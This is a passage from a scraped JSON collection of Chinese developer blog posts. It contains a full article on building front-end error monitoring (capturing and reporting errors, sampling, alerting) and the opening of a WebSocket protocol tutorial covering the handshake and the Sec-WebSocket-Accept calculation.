href=\"https://link.juejin.im?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2Fstephenzhao.github.io%2F2016%2F08%2F19%2FFront-end-Job-Interview-Questions%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">js面向对象</a>的东西，敬请关注我的专栏 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fjscss\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">《前端杂货铺》</a></p><p><br></p></div>"},{"title":"把前端监控做到极致","avatar":"https://user-gold-cdn.xitu.io/2017/11/2/a5e2b2d41d605bbc75219f9c562988e4?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"前端新能源","create_time":"2018 年 01 月 08 日","tags":[],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote><div>本文系第 12 届 D2 前端大会议题《把前端监控做到极致》的总结文章，你也可以直接查看<a href=\"https://link.juejin.im?target=https%3A%2F%2Ftianchi.aliyun.com%2Fcompetition%2FvideoStream.html%23postsId%3D3631\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">现场视频</a> 或 <a href=\"https://link.juejin.im?target=https%3A%2F%2Ffiles.alicdn.com%2Ftpsservice%2F39299d06993224a40767f1d29c6345e7.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PPT</a>。</div></blockquote><div><div><blockquote><p>原发于知乎专栏：<a href=\"https://link.juejin.im?target=https%3A%2F%2Flink.juejin.im%2F%3Ftarget%3Dhttps%253A%252F%252Fzhuanlan.zhihu.com%252Fne-fe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">zhuanlan.zhihu.com/ne-fe</a></p></blockquote></div><p>说到监控，大家第一时间想到的肯定是 Zabbix、Nagios 等各种强大的后端监控服务。诚然，这些强大的平台通过采集服务器以及链路上各种中间件的数据，为我们的应用稳定起到了不可或缺的保驾护航作用。</p></div><p>然而在互联网的另一端，运行在用户终端上的代码却缺少这样强大的监控能力。<br></p><div><div>对于资深工程师来说，想到或者做出一个前端监控方案并不是什么难事 —— 通过监听全局的 window.onerror 事件捕获到运行时错误，然后上报到采集端，再做一个页面展示数据 —— 看起来确实只需要写一个简单的 CRUD 应用就能搞定。</div></div><p>本文将从 采集、数据处理、分析、报警 4 个维度进一步阐述如何把前端监控做到极致。<br></p><h2 data-id=\"heading-0\">小福利</h2><p>如果你还没有使用前端监控服务，那么可以先看看这个小福利。只用两行代码就能打造一个前端异常实时监控平台，还带报错数统计功能。</p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3a1ece151?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"131\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;131&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>其实现思路正如开题所言，通过 window.onerror 采集到所有的未捕获异常，并通过 new Image 的方式构造一个 404 的 HTTP 请求，最后在服务端实时过滤 access.log 中匹配的请求并计数即可。</p><p>实际运行效果如下：<br></p><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3a289aac5?imageslim\" data-width=\"480\" data-height=\"436\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;480&quot; height=&quot;436&quot;&gt;&lt;/svg&gt;\"></div></div><p>浏览器端效果<br></p><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3b2329fb2?imageslim\" data-width=\"524\" data-height=\"476\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;524&quot; height=&quot;476&quot;&gt;&lt;/svg&gt;\"></div></div><p>服务端效果</p><div><div>当然，这个监控系统并不能直接应用在生产环境。要让监控真正发挥价值，还需要从采集、处理、分析、报警等多个方面进行优化增强。</div></div><h2 data-id=\"heading-1\">采集</h2><p><b>Script Error</b><br></p><p>当我们采集前端报错的时候，第一个遇到的问题就是 Script Error。Script Error 不是一种具体的错误，而是浏览器对跨域错误出于安全机制考虑的一种处理方式。</p><div><div>一个前端错误为什么涉及到了「安全」问题呢？2006 年一位安全研究人员发现第三方脚本可以通过页面中报错信息的不同判断当前用户是否登录了指定的网站，并向 Webkit 项目提出了<a href=\"https://link.juejin.im?target=http%3A%2F%2Fblog.jeremiahgrossman.com%2F2006%2F12%2Fi-know-if-youre-logged-in-anywhere.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">相关的 issue</a>。7 年之后，各大浏览器厂商基本都支持了这一安全设定。<br></div><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3a374d6fd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"228\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;228&quot;&gt;&lt;/svg&gt;\"></p></div><p>Webkit 源码中对 Script Error 的处理<br></p><p>简单的说，如果你的页面和页面中引用的 JavaScript 文件不同源（协议、域名、端口不一致），那么这些脚本抛出的错误都属于跨域错误。那么我们在做前端监控捕获这些错误的时候，应该怎么避免采集到 Script Error 呢？<br></p><div>答案是 crossorigin 属性。这是一个应用在 &lt;script&gt; 标签上的属性，添加之后即可保证即使是跨域错误也能捕获到完整的错误信息。然而事情真的只有这么简单吗？</div><p>crossorigin 生效需要服务器端和浏览器端同时支持。服务器端支持比较简单，即返回跨域脚本的服务器（一般为 CDN 服务器）正确的带上 CORS 响应头 —— Access-Control-Allow-Origin: * —— 即可，目前常见的 CDN 服务均支持这一特性。而浏览器端的支持情况就没有这么乐观了。<br></p><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe39f5ac549?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"259\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;259&quot;&gt;&lt;/svg&gt;\"></div></div><p>crossorigin 属性前端支持情况</p><div><div>可以看到，crossorigin 前端支持问题的重灾区发生在 IE 和 Safari 上。IE 这个拖油瓶出现问题是情理之中，Safari 在 9.0 之前的版本也不支持 crossorigin 就说不过去了。这也直接导致了许多运行在 iOS Webview 中的业务无法正确捕获到错误。</div></div><p><b>突破跨域报错限制</b></p><p>那么怎样能突破 crossorigin 的这些限制，尽可能的捕获到更详细的错误呢？<br></p><div>首先最简单也是最直白的方式，就是把页面中所有的跨域资源放在跟页面同样的域下，这样脚本抛出的错误不再是跨域错误，也就不存在 crossorigin 的使用场景了。当然同域化之后也会遇到很多问题，比如无法利用 CDN 的性能、页面单域资源并发加载限制等等。<br></div><p>另一种解决方案是通过 Patch 原生方法来尽可能的捕获到错误，这也是很多监控脚本默认提供的能力。比如说我们可以通过如下代码来 Patch 原生的 setTimeout 方法：</p><pre class=\"hljs bash\"><code>const prevSetTimeout = window.setTimeout;\n\nwindow.setTimeout = <span class=\"hljs-keyword\">function</span>(callback, timeout) {\n  const self = this;\n  <span class=\"hljs-built_in\">return</span> prevSetTimeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() {\n    try {\n      callback.call(this);\n    } catch (e) {\n      // 捕获到详细的错误，在这里处理日志上报等了逻辑\n      // ...\n      throw e;\n    }\n  }, timeout);\n} </code></pre><p>同理，我们还可以 Patch 更多的原生方法，比如 Array.prototype.forEach、setInterval、requestAnimationFrame等等。</p><p>诚然这种方法能帮我们尽可能捕获到更多异常，但是因为 Patch 了 JavaScript 原生的方法，总是感觉会存在很多的不确定性。</p><p>在这里还要提一下去年 QCon 上百姓网前端同学刘小杰提出的一种基于 Babel 的自动添加 try...catch... 的<a href=\"https://link.juejin.im?target=http%3A%2F%2F2016.qconshanghai.com%2Fpresentation%2F3068\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">方法</a>，感兴趣的同学可以去深入看看，会有不少启发。<br></p><p><b>框架层解决方案</b></p><p>在不少现代前端框架中，都提供了框架层的异常处理方案，比如 AngularJS 的 ErrorHandler 和 Vue 的 Vue.config.errorHandler。在这里我们以 React 16 的 componentDidCatch 为例，说明如何使用框架的能力采集错误。</p><p>以下是 React 官网中的示例：<br></p><pre class=\"hljs bash\"><code>class ErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { hasError: <span class=\"hljs-literal\">false</span> };\n  }\n\n  componentDidCatch(error, info) {\n    this.setState({ hasError: <span class=\"hljs-literal\">true</span> });\n\n    // 在这里可以做异常的上报\n    <span class=\"hljs-built_in\">log</span>ErrorToMyService(error, info);\n  }\n\n  <span class=\"hljs-function\"><span class=\"hljs-title\">render</span></span>() {\n    <span class=\"hljs-keyword\">if</span> (this.state.hasError) {\n      <span class=\"hljs-built_in\">return</span> &lt;h1&gt;Something went wrong.&lt;/h1&gt;;\n    }\n    <span class=\"hljs-built_in\">return</span> this.props.children;\n  }\n}\n\n</code></pre><div><div>在使用时，用 ErrorBoundary 包裹你的业务组件即可：</div></div><pre class=\"hljs bash\"><code>&lt;ErrorBoundary&gt;\n  &lt;MyWidget /&gt;\n&lt;/ErrorBoundary&gt;\n\n</code></pre><h2 data-id=\"heading-2\">数据处理</h2><p>传统的监控服务一般都会使用 MySQL 等数据库进行数据持久化，但当数据量指数级增长时，MySQL 这种 OLTP 数据库已经不再适合用来提供监控数据分析服务。</p><p>在大数据时代，搭建一套标准化的、针对监控业务的大数据解决方案已经不是什么难事，下图即为一个简单的数据架构示意图：<br></p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3a267089e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"318\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;318&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>在数据处理过程中，值得一提的是数据采样率的功能设计。</p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3da12dbbc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"300\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>不难看出目前的采样率设计方案都或多或少存在缺陷和妥协，那么有没有一种更优的解决方案呢？</p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3d8ec14af?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"316\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;316&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>经过大量的实践后，我们认为在日志服务进入数据处理流程之前进行采样率控制是比较理想的方案，理由如下：</p><ol><li><div>日志写入成本低</div></li><li><div>rotate 机制保证存储不会浪费</div></li><li><div>了解真实打点请求数据量</div></li><li><div>避免采集端绕过采样率限制</div></li></ol><h2 data-id=\"heading-3\">分析</h2><div><div><b>当故障发生时</b></div></div><p>解决了数据采集和处理的问题，我们应该怎么着手进行分析呢？让我们先看一个真实案例：<br></p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3dc14731e?imageslim\" data-width=\"480\" data-height=\"173\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;480&quot; height=&quot;173&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>当你吃着火锅唱着歌的时候，突然看到实时监控数据暴涨，这个时候你的第一反应是什么呢？是不是手足无措不知道应该怎么处理？当线上出现紧急状况时，我们的首要思路是找到问题触发的特征，比如是否集在某个页面或者某种浏览器等等。</p><div><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3e52367c6?imageslim\" data-width=\"600\" data-height=\"259\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;259&quot;&gt;&lt;/svg&gt;\"></p><p>通过监控平台提供的分析功能，初步定为到问题原因后，再进行深入的调查。</p></div><p><b>报错数高一定是不稳定吗</b></p><p>这里试举两个反例来说明报错数高不一定就是前端不稳定。<br></p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3e900e099?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"392\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;392&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>如上图所示，虽然该应用 1 天爆出了上万的 JavaScript 异常，但是我们在分析过程中发现，95% 的报错都集中在 3 个 userId 上。再对这 3 个 userId 进行深入的调查不难发现，这是 3 个爬取数据的爬虫账号，不巧爬数据的脚本写的有 Bug，被前端监控系统忠实的捕捉到了。</p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3dfb0713e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"248\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;248&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>又如上图所示，某天的数据出现暴增，可能是因为页面的访问量出现暴增。<br></p><div>因此我们不难发现，仅仅通过报错数的多少不足以判断系统是否稳定。<br></div><div><br></div><div><b>异常波动一定有元凶</b></div><p>前端发生故障最常见的原因就是新发布的版本存在 Bug，那么这种问题在监控平台中如何提供分析思路呢？</p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3fbbbcd77?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"253\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;253&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><p>当然，也并不是所有的波动都是前端变更引起。比如说后端接口突然故障，也会导致前端因为无法读取到某个接口结果而报错。<br></p><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3fba206b6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"194\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;194&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><h2 data-id=\"heading-4\">报警</h2><p>说到报警，绝大多数的监控平台都提供规则报警的能力。然而规则报警最大的问题在于随着业务的不断发展，原本配置的规则将会出现阈值过低或过高的问题。若阈值配置过低，则会产生大量的误报警，继而引起整个监控能力的报警疲劳。</p><div><div>为了解决规则报警的问题，监控平台可以引入一些简单的数学模型来解决时序数据的异常识别工作。以最常见的高斯分布（正态分布）为例，利用 3-sigma 原则可以快速判断某一时刻的报错数是否满足概率分布，继而可以产生报警：</div></div><div><div><div><div><div><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d3fe3fd8653dc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"600\" data-height=\"300\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;600&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;\"></div></div></div></div></div><div><div><br></div></div><div><div>当然，这样的报警模型还存在非常大的优化空间，比如对数据周期性、季节性的处理，又比如过滤掉某些可能影响平均数的极高值等。</div></div><h2 data-id=\"heading-5\">结语</h2><p>前端监控看似简单，但想要监控真正发挥价值，还需要从各个方面进行不断的优化和打磨。当然，最重要的是，要意识到前端监控的必要性，及早开始进行监控，才能更好的避免线上故障的产生。</p><p>如果你对我们正在做的事情有兴趣，欢迎加入阿里巴巴和我们一起亲手打造属于自己的数据产品，简历请发 <a href=\"https://link.juejin.im?target=mailto%3Ashuangyang.ys%40alibaba-inc.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">shuangyang.ys@alibaba-inc.com</a><br></p><p><br></p></div>"},{"title":"WebSocket：5分钟从入门到精通","avatar":"https://user-gold-cdn.xitu.io/2016/11/29/660f28857a9f570fb49d52a5ee68039f.jpg?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"程序猿小卡_casper","create_time":"2018 年 01 月 05 日","tags":["Node.js","WebSocket"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">一、内容概览</h2>\n<p>WebSocket的出现，使得浏览器具备了实时双向通信的能力。本文由浅入深，介绍了WebSocket如何建立连接、交换数据的细节，以及数据帧的格式。此外，还简要介绍了针对WebSocket的安全攻击，以及协议是如何抵御类似攻击的。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">二、什么是WebSocket</h2>\n<p>HTML5开始提供的一种浏览器与服务器进行全双工通讯的网络技术，属于应用层协议。它基于TCP传输协议，并复用HTTP的握手通道。</p>\n<p>对大部分web开发者来说，上面这段描述有点枯燥，其实只要记住几点：</p>\n<ol>\n<li>WebSocket可以在浏览器里使用</li>\n<li>支持双向通信</li>\n<li>使用很简单</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-2\">1、有哪些优点</h3>\n<p>说到优点，这里的对比参照物是HTTP协议，概括地说就是：支持双向通信，更灵活，更高效，可扩展性更好。</p>\n<ol>\n<li>支持双向通信，实时性更强。</li>\n<li>更好的二进制支持。</li>\n<li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的的话，需要加上额外的4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>\n<li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>\n</ol>\n<p>对于后面两点，没有研究过WebSocket协议规范的同学可能理解起来不够直观，但不影响对WebSocket的学习和使用。</p>\n<h3 class=\"heading\" data-id=\"heading-3\">2、需要学习哪些东西</h3>\n<p>对网络应用层协议的学习来说，最重要的往往就是<strong>连接建立过程</strong>、<strong>数据交换教程</strong>。当然，数据的格式是逃不掉的，因为它直接决定了协议本身的能力。好的数据格式能让协议更高效、扩展性更好。</p>\n<p>下文主要围绕下面几点展开：</p>\n<ol>\n<li>如何建立连接</li>\n<li>如何交换数据</li>\n<li>数据帧格式</li>\n<li>如何维持连接</li>\n</ol>\n<h2 class=\"heading\" data-id=\"heading-4\">三、入门例子</h2>\n<p>在正式介绍协议细节前，先来看一个简单的例子，有个直观感受。例子包括了WebSocket服务端、WebSocket客户端（网页端）。完整代码可以在 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fchyingp%2Fblog%2Ftree%2Fmaster%2Fdemo%2F2017.05.22-web-socket%2Fws\" rel=\"nofollow noopener noreferrer\">这里</a> 找到。</p>\n<p>这里服务端用了<code>ws</code>这个库。相比大家熟悉的<code>socket.io</code>，<code>ws</code>实现更轻量，更适合学习的目的。</p>\n<h3 class=\"heading\" data-id=\"heading-5\">1、服务端</h3>\n<p>代码如下，监听8080端口。当有新的连接请求到达时，打印日志，同时向客户端发送消息。当收到到来自客户端的消息时，同样打印日志。</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'express'</span>)();\n<span class=\"hljs-keyword\">var</span> server = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>).Server(app);\n<span class=\"hljs-keyword\">var</span> WebSocket = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'ws'</span>);\n\n<span class=\"hljs-keyword\">var</span> wss = <span class=\"hljs-keyword\">new</span> WebSocket.Server({ <span class=\"hljs-attr\">port</span>: <span class=\"hljs-number\">8080</span> });\n\nwss.on(<span class=\"hljs-string\">'connection'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">connection</span>(<span class=\"hljs-params\">ws</span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'server: receive connection.'</span>);\n    \n    ws.on(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">incoming</span>(<span class=\"hljs-params\">message</span>) </span>{\n        <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'server: received: %s'</span>, message);\n    });\n\n    ws.send(<span class=\"hljs-string\">'world'</span>);\n});\n\napp.get(<span class=\"hljs-string\">'/'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">req, res</span>) </span>{\n  res.sendfile(__dirname + <span class=\"hljs-string\">'/index.html'</span>);\n});\n\napp.listen(<span class=\"hljs-number\">3000</span>);\n</code></pre><h3 class=\"heading\" data-id=\"heading-6\">2、客户端</h3>\n<p>代码如下，向8080端口发起WebSocket连接。连接建立后，打印日志，同时向服务端发送消息。接收到来自服务端的消息后，同样打印日志。</p>\n<pre><code class=\"hljs htmlbars\" lang=\"htmlbars\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n  <span class=\"hljs-keyword\">var</span> ws = <span class=\"hljs-keyword\">new</span> WebSocket(<span class=\"hljs-string\">'ws://localhost:8080'</span>);\n  ws.onopen = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'ws onopen'</span>);\n    ws.send(<span class=\"hljs-string\">'from client: hello'</span>);\n  };\n  ws.onmessage = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">e</span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'ws onmessage'</span>);\n    <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'from server: '</span> + e.data);\n  };\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n</span></code></pre><h3 class=\"heading\" data-id=\"heading-7\">3、运行结果</h3>\n<p>可分别查看服务端、客户端的日志，这里不展开。</p>\n<p>服务端输出：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">server: receive connection.\nserver: received hello\n</code></pre><p>客户端输出：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">client: ws connection is open\nclient: received world\n</code></pre><h2 class=\"heading\" data-id=\"heading-8\">四、如何建立连接</h2>\n<p>前面提到，WebSocket复用了HTTP的握手通道。具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。</p>\n<h3 class=\"heading\" data-id=\"heading-9\">1、客户端：申请协议升级</h3>\n<p>首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持<code>GET</code>方法。</p>\n<pre><code class=\"hljs http\" lang=\"http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/</span> HTTP/1.1\n<span class=\"hljs-attribute\">Host</span>: localhost:8080\n<span class=\"hljs-attribute\">Origin</span>: http://127.0.0.1:3000\n<span class=\"hljs-attribute\">Connection</span>: Upgrade\n<span class=\"hljs-attribute\">Upgrade</span>: websocket\n<span class=\"hljs-attribute\">Sec-WebSocket-Version</span>: 13\n<span class=\"hljs-attribute\">Sec-WebSocket-Key</span>: w4v7O6xFTi36lq3RNcgctw==\n</code></pre><p>重点请求首部意义如下：</p>\n<ul>\n<li><code>Connection: Upgrade</code>：表示要升级协议</li>\n<li><code>Upgrade: websocket</code>：表示要升级到websocket协议。</li>\n<li><code>Sec-WebSocket-Version: 13</code>：表示websocket的版本。如果服务端不支持该版本，需要返回一个<code>Sec-WebSocket-Version</code>header，里面包含服务端支持的版本号。</li>\n<li><code>Sec-WebSocket-Key</code>：与后面服务端响应首部的<code>Sec-WebSocket-Accept</code>是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。</li>\n</ul>\n<blockquote>\n<p>注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。</p>\n</blockquote>\n<h3 class=\"heading\" data-id=\"heading-10\">2、服务端：响应协议升级</h3>\n<p>服务端返回内容如下，状态代码<code>101</code>表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。</p>\n<pre><code class=\"hljs http\" lang=\"http\">HTTP/1.1 101 Switching Protocols\nConnection:Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: Oy4NRAQ13jhfONC7bP8dTKb4PTU=\n\n</code></pre><blockquote>\n<p>备注：每个header都以<code>\\r\\n</code>结尾，并且最后一行加上一个额外的空行<code>\\r\\n</code>。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。</p>\n</blockquote>\n<h3 class=\"heading\" data-id=\"heading-11\">3、Sec-WebSocket-Accept的计算</h3>\n<p><code>Sec-WebSocket-Accept</code>根据客户端请求首部的<code>Sec-WebSocket-Key</code>计算出来。</p>\n<p>计算公式为：</p>\n<ol>\n<li>将<code>Sec-WebSocket-Key</code>跟<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>拼接。</li>\n<li>通过SHA1计算出摘要，并转成base64字符串。</li>\n</ol>\n<p>伪代码如下：</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\">&gt;toBase64( sha1( Sec-WebSocket-Key + <span class=\"hljs-number\">258</span>EAFA5-E914<span class=\"hljs-number\">-47</span>DA<span class=\"hljs-number\">-95</span>CA-C5AB0DC85B11 )  )\n</code></pre><p>验证下前面的返回结果：</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">const</span> crypto = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'crypto'</span>);\n<span class=\"hljs-keyword\">const</span> magic = <span class=\"hljs-string\">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>;\n<span class=\"hljs-keyword\">const</span> secWebSocketKey = <span class=\"hljs-string\">'w4v7O6xFTi36lq3RNcgctw=='</span>;\n\n<span class=\"hljs-keyword\">let</span> secWebSocketAccept = crypto.createHash(<span class=\"hljs-string\">'sha1'</span>)\n\t.update(secWebSocketKey + magic)\n\t.digest(<span class=\"hljs-string\">'base64'</span>);\n\n<span class=\"hljs-built_in\">console</span>.log(secWebSocketAccept);\n<span class=\"hljs-comment\">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-12\">五、数据帧格式</h2>\n<p>客户端、服务端数据的交换，离不开数据帧格式的定义。因此，在实际讲解数据交换之前，我们先来看下WebSocket的数据帧格式。</p>\n<p>WebSocket客户端、服务端通信的最小单位是帧（frame），由1个或多个帧组成一条完整的消息（message）。</p>\n<ol>\n<li>发送端：将消息切割成多个帧，并发送给服务端；</li>\n<li>接收端：接收消息帧，并将关联的帧重新组装成完整的消息；</li>\n</ol>\n<p>本节的重点，就是讲解<strong>数据帧</strong>的格式。详细定义可参考 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455%23section-5.2\" rel=\"nofollow noopener noreferrer\">RFC6455 5.2节</a> 。</p>\n<h3 class=\"heading\" 